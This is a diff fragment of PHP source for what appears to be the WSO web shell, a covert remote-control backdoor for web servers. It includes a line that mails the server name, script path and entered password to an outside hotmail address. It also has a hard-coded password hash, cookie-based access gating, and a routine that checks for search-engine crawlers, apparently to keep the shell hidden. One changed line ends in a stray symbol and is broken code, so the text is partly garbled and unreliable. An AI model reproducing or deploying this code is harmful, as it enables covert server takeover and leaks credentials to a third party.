@@ -3,7 +3,7 @@
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('mandra0xdz@hotmail.com', 'wso', $tmp); // Edit or delete!
 }
-
+//-----------------Password---------------------
 $passwordbyme = "0666da94c3b3217475d230d75dccf039"; //lol
 $_agent = true;
 $_unicode = 'UTF-8';
@@ -38,13 +38,14 @@ if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || in
 	$_POST = stripslashes_array($_POST);
     $_COOKIE = stripslashes_array($_COOKIE);
 }
+/* (С) 11.2011 oRb */
 if(!empty($passwordbyme)) {
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $passwordbyme))
         prototype(md5($_SERVER['HTTP_HOST']), $passwordbyme);
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $passwordbyme))
         hardLogin();
 }
-if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$;
+if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
 function hardLogin() {
     if (!empty($_SERVER['HTTP_USER_AGENT'])) {
         $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
